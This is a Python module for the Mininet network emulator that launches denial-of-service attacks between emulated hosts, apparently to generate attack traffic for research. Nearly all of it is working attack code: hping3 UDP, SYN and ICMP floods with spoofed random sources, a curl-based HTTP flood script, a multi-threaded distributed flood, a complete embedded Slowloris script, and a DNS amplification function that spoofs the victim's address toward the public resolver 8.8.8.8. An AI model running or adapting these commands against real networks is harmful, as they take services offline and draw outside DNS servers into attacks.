
import threading
import time
import traceback
from colorama import Fore
from mininet.node import Host
from utility.my_log import information, debug, error

"""
Summary & Recommendations
Most Practical for Your Use Case:
Attack Type Difficulty to Detect Resource Usage Realism Recommended
UDP Flood Easy High Medium ✅ Current
TCP SYN Flood Medium Medium High ✅ Best
ICMP Flood Easy Low Low ⚠️ Simple
HTTP Flood Hard Medium High ✅ Good
DDoS (Multiple) Varies Very High Very High ✅ Advanced
Slowloris Very Hard Low Very High ✅ Stealthy

TCP SYN Flood is probably the best single choice because it:
✅ Creates realistic traffic patterns
✅ Targets actual services (port 80, 443, etc.)
✅ Easier to detect than slowloris but harder than UDP
✅ More stable than UDP flood (less likely to crash)

"""

class AttackType:
    """Attack types with their requirements and characteristics."""
    UDP_FLOOD = {
        "name": "udp_flood",
        "function": "launch_udp_flood",
        "requires_service": False,
        "difficulty": "easy",
        "bandwidth_intensive": True,
    }
    
    SYN_FLOOD = {
        "name": "syn_flood",
        "function": "launch_tcp_syn_flood",
        "requires_service": False,  # SYN flood works even without service
        "difficulty": "medium",
        "bandwidth_intensive": True,
    }
    
    ICMP_FLOOD = {
        "name": "icmp_flood",
        "function": "launch_icmp_flood",
        "requires_service": False,
        "difficulty": "easy",
        "bandwidth_intensive": True,
    }
    
    HTTP_FLOOD = {
        "name": "http_flood",
        "function": "launch_http_flood",
        "requires_service": True,  # Needs web server
        "service_type": "http",
        "difficulty": "hard",
        "bandwidth_intensive": False,
    }
    
    SLOWLORIS = {
        "name": "slowloris",
        "function": "launch_slowloris",
        "requires_service": True,  # Needs web server
        "service_type": "http",
        "difficulty": "very_hard",
        "bandwidth_intensive": False,
    }

def get_available_attacks(victim: Host, victim_services: dict = None):
    """
    Get list of attacks that can be launched against a victim.
    
    Args:
        victim: Victim host
        victim_services: Dict of running services like {"http": 80, "https": 443}
        
    Returns:
        List of available attack types
    """
    available = []
    
    # Always available attacks (don't need services)
    always_available = [
        AttackType.UDP_FLOOD,
        AttackType.SYN_FLOOD,
        AttackType.ICMP_FLOOD,
    ]
    available.extend(always_available)
    
    # HTTP-based attacks (only if web server running)
    if victim_services and "http" in victim_services:
        available.extend([
            AttackType.HTTP_FLOOD,
            AttackType.SLOWLORIS,
        ])
    
    return available


def launch_attack_smart(attacker: Host, victim: Host, duration: int = 15, 
                       attack_type: dict = None, auto_start_service: bool = False):
    """
    Launch an attack, optionally starting required services first.
    
    Args:
        attacker: Attacking host
        victim: Victim host
        duration: Attack duration
        attack_type: Attack type dict from AttackType class
        auto_start_service: If True, automatically start required services
        
    Returns:
        True if attack successful, False otherwise
    """
    if attack_type is None:
        attack_type = AttackType.UDP_FLOOD
    
    # Check if service is required
    if attack_type.get("requires_service"):
        service_type = attack_type.get("service_type")
        
        if service_type == "http":
            # Check if web server is running
            check = victim.cmd("netstat -tln | grep ':80' || ss -tln | grep ':80'").strip()
            
            if not check:
                if auto_start_service:
                    information(f"Starting web server on {victim.name} for {attack_type['name']}")
                    if not start_web_server_on_host(victim, port=80):
                        error(f"Failed to start web server on {victim.name}")
                        return False
                else:
                    error(f"Attack {attack_type['name']} requires HTTP service on {victim.name}")
                    return False
    
    # Launch the attack
    attack_func_name = attack_type["function"]
    
    if attack_func_name == "launch_udp_flood":
        return launch_udp_flood(attacker, victim, duration)
    elif attack_func_name == "launch_tcp_syn_flood":
        return launch_tcp_syn_flood(attacker, victim, duration)
    elif attack_func_name == "launch_icmp_flood":
        return launch_icmp_flood(attacker, victim, duration)
    elif attack_func_name == "launch_http_flood":
        return launch_http_flood(attacker, victim, duration)
    elif attack_func_name == "launch_slowloris":
        return launch_slowloris(attacker, victim, duration)
    else:
        error(f"Unknown attack function: {attack_func_name}")
        return False

def prepare_attacker_for_dos(attacker: Host):
    """Prepare a host to launch high-volume attacks."""
    # Increase file descriptor limit
    attacker.cmd("ulimit -n 65535")
    
    # Increase socket buffer sizes
    attacker.cmd("sysctl -w net.core.wmem_max=134217728 2>/dev/null")
    attacker.cmd("sysctl -w net.core.rmem_max=134217728 2>/dev/null")
    attacker.cmd("sysctl -w net.core.wmem_default=16777216 2>/dev/null")
    attacker.cmd("sysctl -w net.core.rmem_default=16777216 2>/dev/null")
    
    # Increase network buffer sizes
    attacker.cmd("sysctl -w net.ipv4.udp_wmem_min=16384 2>/dev/null")
    attacker.cmd("sysctl -w net.ipv4.udp_rmem_min=16384 2>/dev/null")
    
    # Disable connection tracking for better performance
    attacker.cmd("sysctl -w net.netfilter.nf_conntrack_max=0 2>/dev/null")
    
    # Store original values for cleanup
    if not hasattr(attacker, '_original_sysctl'):
        attacker._original_sysctl = {
            'wmem_max': attacker.cmd("sysctl -n net.core.wmem_max 2>/dev/null").strip(),
            'rmem_max': attacker.cmd("sysctl -n net.core.rmem_max 2>/dev/null").strip(),
        }
    
    debug(f"Prepared {attacker.name} for DoS attacks")


def cleanup_attacker_after_dos(attacker: Host):
    """Restore original settings after DoS attack."""
    if hasattr(attacker, '_original_sysctl'):
        orig = attacker._original_sysctl
        
        # Restore original values
        if orig.get('wmem_max'):
            attacker.cmd(f"sysctl -w net.core.wmem_max={orig['wmem_max']} 2>/dev/null")
        if orig.get('rmem_max'):
            attacker.cmd(f"sysctl -w net.core.rmem_max={orig['rmem_max']} 2>/dev/null")
        
        debug(f"Cleaned up {attacker.name} after DoS attack")
    
    # Kill any remaining hping3 processes
    attacker.cmd("killall -9 hping3 2>/dev/null")
    
    # Clean up temp files
    attacker.cmd("rm -f /tmp/hping3_*.log 2>/dev/null")


def launch_udp_flood(attacker: Host, victim: Host, duration: int = 15):
    """
    Launch a DoS attack with robust process monitoring and auto-restart.
    """
    information(Fore.RED + f"{attacker.name} launching UDP flood on {victim.name} for duration {duration}\n" + Fore.WHITE)
    victim_ip = victim.IP()

    # Ensure `hping3` is installed
    hping_check = attacker.cmd("which hping3")
    if not hping_check.strip():
        msg = f"{attacker.name} does not have hping3 installed."
        error(msg)
        return False
    
    # Prepare attacker
    prepare_attacker_for_dos(attacker)
    
    # Create log files
    log_file = f"/tmp/hping3_{attacker.name}_{int(time.time())}.log"
    pid_file = f"/tmp/hping3_{attacker.name}.pid"
    
    try:
        # Start hping3 with proper backgrounding
        # Use 'setsid' to detach from terminal and prevent signal propagation
        attack_cmd = f"setsid nohup hping3 --flood --udp {victim_ip} > {log_file} 2>&1 & echo $! > {pid_file}"
        attacker.cmd(attack_cmd)
        
        time.sleep(0.5)
        
        # Get the PID from file (more reliable)
        pid = attacker.cmd(f"cat {pid_file} 2>/dev/null").strip()
        
        if not pid:
            error(Fore.RED + f"Failed to get PID for hping3 on {attacker.name}\n" + Fore.WHITE)
            log_content = attacker.cmd(f"cat {log_file} 2>&1")
            error(f"hping3 startup log: {log_content}")
            cleanup_attacker_after_dos(attacker)
            return False
        
        # Verify process is actually running
        verify = attacker.cmd(f"ps -p {pid} -o pid=").strip()
        if not verify:
            error(Fore.RED + f"hping3 PID {pid} not found immediately after start\n" + Fore.WHITE)
            cleanup_attacker_after_dos(attacker)
            return False
        
        debug(f"hping3 started with PID {pid}")
        
        # Monitor the attack with auto-restart capability
        restart_count = 0
        max_restarts = 2
        elapsed_time = 0
        check_interval = 1  # Check every second
        
        while elapsed_time < duration:
            process_check = attacker.cmd(f"ps -p {pid} -o pid=").strip()
            
            if not process_check:
                error(Fore.YELLOW + f"hping3 process (PID {pid}) stopped at second {elapsed_time}\n" + Fore.WHITE)
                
                # Check log for errors
                log_content = attacker.cmd(f"cat {log_file} 2>&1")
                debug(f"hping3 log at failure: {log_content[:300]}")
                
                # Try to restart if we haven't exceeded restart limit
                if restart_count < max_restarts and elapsed_time < duration - 5:
                    restart_count += 1
                    information(Fore.YELLOW + f"Attempting to restart hping3 (attempt {restart_count}/{max_restarts})\n" + Fore.WHITE)
                    
                    # Restart with new PID
                    attack_cmd = f"setsid nohup hping3 --flood --udp {victim_ip} >> {log_file} 2>&1 & echo $! > {pid_file}"
                    attacker.cmd(attack_cmd)
                    time.sleep(0.5)
                    
                    new_pid = attacker.cmd(f"cat {pid_file} 2>/dev/null").strip()
                    if new_pid and attacker.cmd(f"ps -p {new_pid} -o pid=").strip():
                        pid = new_pid
                        information(Fore.GREEN + f"hping3 restarted with PID {pid}\n" + Fore.WHITE)
                    else:
                        error(Fore.RED + f"Failed to restart hping3\n" + Fore.WHITE)
                        break
                else:
                    error(Fore.RED + f"Max restarts ({max_restarts}) exceeded or too close to end time\n" + Fore.WHITE)
                    break
            else:
                debug(f"hping3 (PID {pid}) running at second {elapsed_time}")
            
            time.sleep(check_interval)
            elapsed_time += check_interval

        # Stop the attack
        attacker.cmd(f"kill -9 {pid} 2>/dev/null")
        time.sleep(0.5)
        attacker.cmd("killall -9 hping3 2>/dev/null")
        
        # Check final output
        final_log = attacker.cmd(f"cat {log_file} 2>&1")
        debug(f"hping3 final log: {final_log[:500]}")
        
        success = elapsed_time >= duration - 2  # Allow 2 second tolerance
        
        if success:
            information(Fore.GREEN + f"{attacker.name} completed attack on {victim.name} (ran {elapsed_time}s of {duration}s)\n" + Fore.WHITE)
        else:
            error(Fore.RED + f"{attacker.name} attack on {victim.name} incomplete (ran {elapsed_time}s of {duration}s)\n" + Fore.WHITE)
        
        return success
        
    except Exception as e:
        error(Fore.RED + f"Exception in launch_dos_attack: {type(e).__name__}: {str(e)}\n{traceback.format_exc()}" + Fore.WHITE)
        return False
    finally:
        # Always cleanup
        cleanup_attacker_after_dos(attacker)
        # Clean up temp files
        attacker.cmd(f"rm -f {log_file} {pid_file} 2>/dev/null")


# Simpler version: Just use timeout and accept that it might stop early
def launch_udp_flood_smart(attacker: Host, victim: Host, duration: int = 15):
    """
    Launch a DoS attack with timeout-based duration control.
    Simpler but accepts that process might stop early.
    """
    information(Fore.RED + f"{attacker.name} launching UDP flood on {victim.name} for duration {duration}\n" + Fore.WHITE)
    victim_ip = victim.IP()

    # Ensure `hping3` is installed
    hping_check = attacker.cmd("which hping3")
    if not hping_check.strip():
        error(f"{attacker.name} does not have hping3 installed.")
        return False
    
    # Prepare attacker
    prepare_attacker_for_dos(attacker)
    
    log_file = f"/tmp/hping3_{attacker.name}_{int(time.time())}.log"
    
    try:
        # Use timeout to automatically stop after duration
        # Use 'setsid' to prevent signal issues
        attack_cmd = f"setsid timeout {duration}s hping3 --flood --udp {victim_ip} > {log_file} 2>&1 &"
        attacker.cmd(attack_cmd)
        
        time.sleep(0.5)
        
        # Verify it started
        pid = attacker.cmd("pgrep -f 'hping3.*flood' | head -1").strip()
        
        if not pid:
            error(Fore.RED + f"Failed to start hping3 on {attacker.name}\n" + Fore.WHITE)
            log_content = attacker.cmd(f"cat {log_file} 2>&1")
            error(f"hping3 log: {log_content}")
            return False
        
        information(Fore.RED + f"hping3 started with PID {pid}\n" + Fore.WHITE)
        
        # Wait for duration (timeout will kill it automatically)
        time.sleep(duration)
        
        # Ensure cleanup
        attacker.cmd("killall -9 hping3 2>/dev/null")
        
        # Check if it ran successfully
        log_content = attacker.cmd(f"cat {log_file} 2>&1")
        
        # hping3 in flood mode doesn't output statistics, so just check it ran
        if "flood mode" in log_content:
            information(Fore.YELLOW + f"{attacker.name} has stopped attacking {victim.name}\n" + Fore.WHITE)
            return True
        else:
            error(f"hping3 may have failed: {log_content[:200]}")
            return False
            
    except Exception as e:
        error(Fore.RED + f"Exception: {type(e).__name__}: {str(e)}\n" + Fore.WHITE)
        return False
    finally:
        cleanup_attacker_after_dos(attacker)
        attacker.cmd(f"rm -f {log_file} 2>/dev/null")
        
def launch_udp_flood_async(attacker: Host, victim: Host, duration: int = 15):
    """
    Launch a DoS attack and return immediately after confirming it started.
    The attack runs in the background for the specified duration.
    
    Returns:
        True if attack started successfully, False otherwise
    """
    information(Fore.RED + f"{attacker.name} launching UDP flood on {victim.name} for duration {duration}\n" + Fore.WHITE)
    victim_ip = victim.IP()

    # Ensure `hping3` is installed
    hping_check = attacker.cmd("which hping3")
    if not hping_check.strip():
        msg = f"{attacker.name} does not have hping3 installed."
        error(msg)
        return False
    
    # Start hping3 in background with nohup and auto-timeout
    attack_cmd = f"nohup timeout {duration}s hping3 --flood --udp {victim_ip} > /dev/null 2>&1 &"
    attacker.cmd(attack_cmd)
    
    # Give it a moment to start
    time.sleep(0.5)
    
    # Get the PID and verify it started
    pid = attacker.cmd("pgrep -f 'hping3.*flood.*{}' | head -1".format(victim_ip)).strip()
    
    if not pid:
        error(Fore.RED + f"Failed to start hping3 on {attacker.name}\n" + Fore.WHITE)
        return False
    
    information(Fore.RED + f"hping3 started with PID {pid} on {attacker.name}\n" + Fore.WHITE)
    
    # Attack is now running in background with auto-timeout
    # No need to monitor it - timeout will kill it automatically
    return True


def launch_tcp_syn_flood(attacker: Host, victim: Host, duration: int = 15, port: int = 80):
    """
    TCP SYN flood attack - sends SYN packets without completing handshake.
    More realistic than UDP flood, targets TCP services.
    Overwhelms the victim by sending many SYN packets without completing the handshake
    """
    information(Fore.RED + f"{attacker.name} launching TCP SYN flood on {victim.name}:{port}\n" + Fore.WHITE)
    victim_ip = victim.IP()
    
    # Check hping3
    if not attacker.cmd("which hping3").strip():
        error("hping3 not installed")
        return False
    
    prepare_attacker_for_dos(attacker)
    
    try:
        # -S = SYN flag, -p = port, --flood = max speed, --rand-source = random source IPs
        attack_cmd = f"setsid timeout {duration}s hping3 -S -p {port} --flood --rand-source {victim_ip} >/dev/null 2>&1 &"
        attacker.cmd(attack_cmd)
        
        time.sleep(0.5)
        pid = attacker.cmd("pgrep -f 'hping3.*-S' | head -1").strip()
        
        if not pid:
            error("Failed to start SYN flood")
            return False
        
        information(f"TCP SYN flood started with PID {pid}")
        time.sleep(duration)
        attacker.cmd("killall -9 hping3 2>/dev/null")
        
        information(Fore.YELLOW + f"SYN flood stopped\n" + Fore.WHITE)
        return True
        
    finally:
        cleanup_attacker_after_dos(attacker)


def launch_icmp_flood(attacker: Host, victim: Host, duration: int = 15):
    """
    ICMP flood (ping flood) - overwhelms with ping requests.
    Simpler than UDP/TCP, uses standard ping command.
    Classic ping flood - simple but effective.
    """
    information(Fore.RED + f"{attacker.name} launching ICMP flood on {victim.name}\n" + Fore.WHITE)
    victim_ip = victim.IP()
    
    prepare_attacker_for_dos(attacker)
    
    try:
        # -f = flood mode, -s = packet size
        attack_cmd = f"setsid timeout {duration}s ping -f -s 65507 {victim_ip} >/dev/null 2>&1 &"
        attacker.cmd(attack_cmd)
        
        time.sleep(0.5)
        pid = attacker.cmd("pgrep -f 'ping.*-f' | head -1").strip()
        
        if not pid:
            error("Failed to start ICMP flood")
            return False
        
        information(f"ICMP flood started with PID {pid}")
        time.sleep(duration)
        attacker.cmd("killall -9 ping 2>/dev/null")
        
        information(Fore.YELLOW + f"ICMP flood stopped\n" + Fore.WHITE)
        return True
        
    finally:
        cleanup_attacker_after_dos(attacker)

def launch_http_flood(attacker: Host, victim: Host, duration: int = 15, port: int = 80):
    """
    HTTP flood - sends many HTTP requests to overwhelm web server.
    More sophisticated, targets application layer.
    Application-layer attack targeting web servers.
    """
    information(Fore.RED + f"{attacker.name} launching HTTP flood on {victim.name}:{port}\n" + Fore.WHITE)
    victim_ip = victim.IP()
    start_web_server_on_host(victim, port)
    
    prepare_attacker_for_dos(attacker)
    
    # Create HTTP flood script
    script = f"""#!/bin/bash
                end_time=$(($(date +%s) + {duration}))
                while [ $(date +%s) -lt $end_time ]; do
                    curl -s "http://{victim_ip}:{port}/" >/dev/null 2>&1 &
                    curl -s "http://{victim_ip}:{port}/index.html" >/dev/null 2>&1 &
                    curl -s "http://{victim_ip}:{port}/test" >/dev/null 2>&1 &
                done
                wait
                """
    
    try:
        attacker.cmd(f"cat > /tmp/http_flood_{attacker.name}.sh << 'EOF'\n{script}\nEOF")
        attacker.cmd(f"chmod +x /tmp/http_flood_{attacker.name}.sh")
        attacker.cmd(f"setsid /tmp/http_flood_{attacker.name}.sh >/dev/null 2>&1 &")
        
        time.sleep(0.5)
        pid = attacker.cmd(f"pgrep -f 'http_flood_{attacker.name}'").strip()
        
        if not pid:
            error("Failed to start HTTP flood")
            return False
        
        information(f"HTTP flood started with PID {pid}")
        time.sleep(duration)
        
        # Cleanup
        attacker.cmd(f"pkill -9 -f 'http_flood_{attacker.name}' 2>/dev/null")
        attacker.cmd("killall -9 curl 2>/dev/null")
        attacker.cmd(f"rm -f /tmp/http_flood_{attacker.name}.sh")
        
        information(Fore.YELLOW + f"HTTP flood stopped\n" + Fore.WHITE)
        return True
        
    finally:
        cleanup_attacker_after_dos(attacker)
        #stop_web_server_on_host(victim, port)

def start_web_server_on_host(host: Host, port: int = 80):
    """
    Start a simple HTTP server on a host for testing HTTP-based attacks.
    
    Args:
        host: Host object to start server on
        port: Port to listen on (default 80)
        
    Returns:
        True if server started successfully, False otherwise
    """
    # Kill any existing web servers on this port
    host.cmd(f"pkill -9 -f 'python.*http.server.*{port}' 2>/dev/null")
    host.cmd(f"fuser -k {port}/tcp 2>/dev/null")
    
    time.sleep(0.2)
    
    # Start simple Python HTTP server
    # Python 3: python3 -m http.server
    server_cmd = f"setsid python3 -m http.server {port} >/dev/null 2>&1 &"
    host.cmd(server_cmd)
    
    time.sleep(0.5)
    
    # Verify server started
    check = host.cmd(f"netstat -tln | grep ':{port}' || ss -tln | grep ':{port}'").strip()
    
    if check:
        debug(f"Web server started on {host.name}:{port}")
        return True
    else:
        error(f"Failed to start web server on {host.name}:{port}")
        return False


def stop_web_server_on_host(host: Host, port: int = 80):
    """Stop web server on a host."""
    host.cmd(f"pkill -9 -f 'python.*http.server.*{port}' 2>/dev/null")
    host.cmd(f"fuser -k {port}/tcp 2>/dev/null")
    debug(f"Stopped web server on {host.name}:{port}")


        
def launch_dns_amplification(attacker: Host, victim: Host, duration: int = 15):
    """
    DNS amplification attack - spoofs victim's IP in DNS queries.
    Causes DNS servers to send large responses to victim.
    Uses DNS servers to amplify attack traffic.
    """
    information(Fore.RED + f"{attacker.name} launching DNS amplification on {victim.name}\n" + Fore.WHITE)
    victim_ip = victim.IP()
    
    # Check if hping3 is available
    if not attacker.cmd("which hping3").strip():
        error("hping3 not installed")
        return False
    
    prepare_attacker_for_dos(attacker)
    
    try:
        # Send UDP packets to port 53 (DNS) with spoofed source IP
        attack_cmd = f"setsid timeout {duration}s hping3 --udp -p 53 --flood --spoof {victim_ip} 8.8.8.8 >/dev/null 2>&1 &"
        attacker.cmd(attack_cmd)
        
        time.sleep(0.5)
        pid = attacker.cmd("pgrep -f 'hping3.*--spoof' | head -1").strip()
        
        if not pid:
            error("Failed to start DNS amplification")
            return False
        
        information(f"DNS amplification started with PID {pid}")
        time.sleep(duration)
        attacker.cmd("killall -9 hping3 2>/dev/null")
        
        information(Fore.YELLOW + f"DNS amplification stopped\n" + Fore.WHITE)
        return True
        
    finally:
        cleanup_attacker_after_dos(attacker)    
        
        
def launch_distributed_dos(attackers: list, victim: Host, duration: int = 15, attack_type: str = "udp"):
    """
    Distributed DoS - multiple attackers target one victim.
    More realistic simulation of botnet attacks.
    Coordinate multiple hosts to attack one victim.
    
    Args:
        attackers: List of attacker Host objects
        victim: Victim Host object
        duration: Attack duration
        attack_type: "udp", "syn", or "icmp"
    """
    information(Fore.RED + f"Launching DDoS with {len(attackers)} attackers on {victim.name}\n" + Fore.WHITE)
    
    threads = []
    
    for attacker in attackers:
        if attack_type == "udp":
            thread = threading.Thread(
                target=launch_udp_flood,
                args=(attacker, victim, duration),
                daemon=True
            )
        elif attack_type == "syn":
            thread = threading.Thread(
                target=launch_tcp_syn_flood,
                args=(attacker, victim, duration),
                daemon=True
            )
        elif attack_type == "icmp":
            thread = threading.Thread(
                target=launch_icmp_flood,
                args=(attacker, victim, duration),
                daemon=True
            )
        else:
            error(f"Unknown attack type: {attack_type}")
            continue
        
        thread.start()
        threads.append(thread)
        time.sleep(0.2)  # Stagger start times slightly
    
    # Wait for all attacks to complete
    for thread in threads:
        thread.join()
    
    information(Fore.GREEN + f"DDoS attack completed\n" + Fore.WHITE)
    return True      

def launch_slowloris(attacker: Host, victim: Host, duration: int = 15, port: int = 80, connections: int = 200):
    """
    Slowloris attack - keeps many HTTP connections open with slow requests.
    Application-layer attack that exhausts server connection pool.
    Keeps many connections open by sending partial HTTP requests.
    """
    information(Fore.RED + f"{attacker.name} launching Slowloris on {victim.name}:{port}\n" + Fore.WHITE)
    victim_ip = victim.IP()
    
    # Create Python slowloris script
    script = f"""
import socket
import time
import random

target = "{victim_ip}"
port = {port}
duration = {duration}
num_sockets = {connections}

sockets = []
headers = [
    "User-Agent: Mozilla/5.0",
    "Accept-Language: en-US",
    "Connection: keep-alive"
]

# Create sockets
for _ in range(num_sockets):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send("GET /? HTTP/1.1\\r\\n".encode())
        for header in headers:
            s.send(f"{{header}}\\r\\n".encode())
        sockets.append(s)
    except:
        pass

print(f"Established {{len(sockets)}} connections", flush=True)

# Keep connections alive
end_time = time.time() + duration
while time.time() < end_time:
    for s in list(sockets):
        try:
            s.send(f"X-a: {{random.randint(1, 5000)}}\\r\\n".encode())
        except:
            sockets.remove(s)
            try:
                new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                new_s.settimeout(4)
                new_s.connect((target, port))
                new_s.send("GET /? HTTP/1.1\\r\\n".encode())
                sockets.append(new_s)
            except:
                pass
    time.sleep(15)

# Cleanup
for s in sockets:
    try:
        s.close()
    except:
        pass
"""
    
    try:
        attacker.cmd(f"cat > /tmp/slowloris_{attacker.name}.py << 'EOF'\n{script}\nEOF")
        attacker.cmd(f"setsid python3 /tmp/slowloris_{attacker.name}.py >/dev/null 2>&1 &")
        
        time.sleep(1)
        pid = attacker.cmd(f"pgrep -f 'slowloris_{attacker.name}'").strip()
        
        if not pid:
            error("Failed to start Slowloris")
            return False
        
        information(f"Slowloris started with PID {pid}")
        time.sleep(duration + 2)
        
        attacker.cmd(f"pkill -9 -f 'slowloris_{attacker.name}' 2>/dev/null")
        attacker.cmd(f"rm -f /tmp/slowloris_{attacker.name}.py")
        
        information(Fore.YELLOW + f"Slowloris stopped\n" + Fore.WHITE)
        return True
        
    except Exception as e:
        error(f"Slowloris error: {e}")
        return False      

def test_dos_attack(net, must_stop = True):
    """Test DoS attack functionality"""
    attacker, victim = net.hosts[0], net.hosts[1]
    if launch_udp_flood(attacker, victim, duration=5):
        information(Fore.GREEN + f"DoS attack test from {attacker.name} to {victim.name} completed successfully.\n" + Fore.WHITE)
    else:
        error(Fore.RED + f"DoS attack test from {attacker.name} to {victim.name} failed.\n" + Fore.WHITE)
    time.sleep(2) 
    if must_stop:
        net.stop()